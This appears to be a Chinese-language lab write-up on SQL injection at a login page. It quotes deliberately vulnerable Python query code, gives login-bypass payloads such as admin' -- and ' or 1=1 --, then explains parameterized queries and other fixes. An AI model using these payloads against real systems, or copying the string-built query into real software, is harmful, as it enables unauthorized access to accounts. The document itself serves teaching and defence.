# 登录处的 SQL 注入

## 这一题在教什么

SQL 注入最基础的一招：**闭合引号 + 注释掉后半句**。新手看完文档往往还是不知道
「单引号闭合」到底什么意思，这题就是让你亲手把它打出来。

## 漏洞在哪

`module.py` 里 `create_app()` 的 `index()`：

```python
sql = (
    "SELECT username, role FROM users "
    "WHERE username = '%s' AND password = '%s'" % (username, password)
)
```

用户名和密码被 `%` 直接拼进语句。你自己输入的内容，变成了 SQL 语法的一部分。

## 怎么打通

第一步，在用户名里敲一个单引号：

```
用户名: '
密码:   x
```

页面会报错，并把真正执行的语句贴出来：

```
SELECT username, role FROM users WHERE username = ''' AND password = 'x'
```

看到这行你就该明白了：你的单引号把 SQL 里原本的字符串给「提前关掉」了。

第二步，把后面那半句干掉。SQL 里 `--` 是行注释：

```
用户名: admin' --
密码:   1
```

实际执行变成：

```sql
SELECT username, role FROM users WHERE username = 'admin' --' AND password = '1'
```

密码检查被注释掉了，只剩 `username = 'admin'`，于是直接进去。

别的写法也能通，随便试：

```
admin' or '1'='1' --
' or 1=1 --
```

## 怎么修

用参数化查询，让数据库把用户输入当**数据**而不是**代码**：

```python
con.execute(
    "SELECT username, role FROM users WHERE username = ? AND password = ?",
    (username, password),
)
```

顺带三件同样重要的事：

1. **别把数据库报错回显给用户** —— 报错里那条 SQL 就是给攻击者的地图。
2. **密码要哈希存储**（用 bcrypt / argon2），`app.db` 里现在存的是明文。
3. 关闭调试模式，别让堆栈信息漏出去。

## 顺手想想

- 这题是「有回显」的注入。如果页面只说「用户名或密码错误」，
  一句也不多说，你还能怎么判断注入存不存在？（提示：布尔盲注、时间盲注）
- `ORDER BY` 后面的注入和这里有什么不一样？为什么那里参数化不管用？
